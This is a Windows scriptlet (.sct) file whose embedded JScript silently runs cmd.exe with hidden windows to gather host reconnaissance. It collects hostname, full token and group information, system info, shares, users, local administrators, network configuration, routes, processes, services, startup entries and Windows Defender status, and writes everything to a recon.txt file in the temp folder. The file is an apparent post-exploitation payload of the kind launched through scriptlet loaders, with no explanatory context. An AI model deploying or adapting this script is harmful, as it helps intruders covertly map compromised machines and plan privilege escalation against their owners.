<?xml version="1.0" encoding="UTF-8"?>
<scriptlet>
  <registration
    progid="ReconScript"
    classid="{F1111111-0000-0000-0000-0000FEEDC0DE}">
    <script language="JScript">
      <![CDATA[

        var shell = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var temp = shell.ExpandEnvironmentStrings("%TEMP%");
        var reconFile = fso.BuildPath(temp, "recon.txt");

        function run(cmd) {
          var fullCmd = 'cmd.exe /c ' + cmd + ' >> "' + reconFile + '"';
          shell.Run(fullCmd, 0, true);
        }

        // Initialize recon file
        shell.Run('cmd.exe /c echo --- Recon Started --- > "' + reconFile + '"', 0, true);

        // Recon commands
        run("echo --- Hostname --- && hostname");
        run("echo --- User Info --- && whoami && whoami /all");
        run("echo --- System Info --- && systeminfo && ver");
        run("echo --- Drives --- && wmic logicaldisk get name");
        run("echo --- Shares --- && net share");
        run("echo --- Users --- && net user");
        run("echo --- Groups --- && net localgroup && net localgroup administrators");
        run("echo --- IP Config --- && ipconfig /all");
        run("echo --- Routing Table --- && route print");
        run("echo --- Processes --- && wmic process list full");
        run("echo --- Services --- && sc query");
        run("echo --- Startup --- && wmic startup get caption,command");
        run("echo --- Defender --- && sc query windefend");
        run("echo --- Recon Complete ---");

      ]]>
    </script>
  </registration>
</scriptlet>
